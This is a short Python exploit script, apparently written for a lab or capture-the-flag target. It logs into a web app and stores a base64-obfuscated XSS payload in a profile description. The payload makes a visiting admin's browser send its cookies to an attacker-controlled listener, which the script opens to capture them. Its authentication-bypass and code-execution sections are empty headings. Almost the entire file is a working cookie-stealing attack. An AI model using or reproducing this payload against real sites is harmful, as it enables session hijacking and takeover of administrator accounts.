import requests
import argparse
import socket
import base64

parser = argparse.ArgumentParser(description="Injects an XSS payload into user's description to steal admin cookie")
parser.add_argument("target",help="Target URL")
parser.add_argument("userAdm",help="User")
parser.add_argument("passwordAdm",help="Password")
parser.add_argument("--lhost",help="Host to listen on",default="192.168.2.8")
parser.add_argument("--lport",help="Port to listen on",default="8000")
args = parser.parse_args()

#Authentication bypass



#Privilege escalation

if args.target[-1] == "/":
    args.target = args.target[:-1]

s = requests.Session()
r = s.post(
    f"{args.target}/login.php",
    data={"username":args.userAdm,"password":args.passwordAdm},
    allow_redirects=False
)
print(r.status_code)
assert r.status_code == 302
print(f"[*] Logged in as {args.userAdm}")

b64 = base64.b64encode(f"fetch('//{args.lhost}:{args.lport}/'+btoa(document.cookie))".encode()).decode()
payload = f"<img src/onerror='eval(atob(`{b64}`))'/>"
r = s.post(
    f"{args.target}/profile.php",
    data={"description":payload}
)
print(r.text)
assert "Success" in r.text
print(f"[*] Set {args.userAdm}'s description to XSS payload")


s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((args.lhost,int(args.lport)))
s.listen()
print(f"[*] Listening on {args.lhost}:{args.lport}...")
print("[*] Waiting for admin to visit homepage...")

(sock_c, ip_c) = s.accept()
get_request = sock_c.recv(4096)
admin_cookie = base64.b64decode(get_request.split(b" ")[1][1:]).decode()
print(f"[+] Got admin cookie: {admin_cookie}")


#Remote code execution